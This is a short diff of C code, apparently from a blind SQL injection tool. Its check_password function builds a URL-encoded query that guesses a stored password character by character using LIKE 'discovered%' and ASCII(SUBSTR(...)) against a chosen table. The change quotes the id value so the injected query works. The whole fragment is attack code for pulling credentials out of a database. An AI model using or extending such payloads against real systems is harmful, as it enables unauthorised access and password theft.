@@ -281,7 +281,7 @@ bool check_password(const void *ctx) {
         "%%60%s%%60" // FROM `table_name`
         "%%20WHERE%%20"
         "%%60%s%%60" // WHERE `id_col`
-        "%%3d322695107%%20AND%%20"
+        "%%3d%%27322695107%%27%%20AND%%20"
         "%%60%s%%60" // AND `pwd_col`...
         "%%20LIKE%%20%%27%s%%25%%27%%20" // ...LIKE 'discovered%'
         "AND%%20ASCII(SUBSTR("
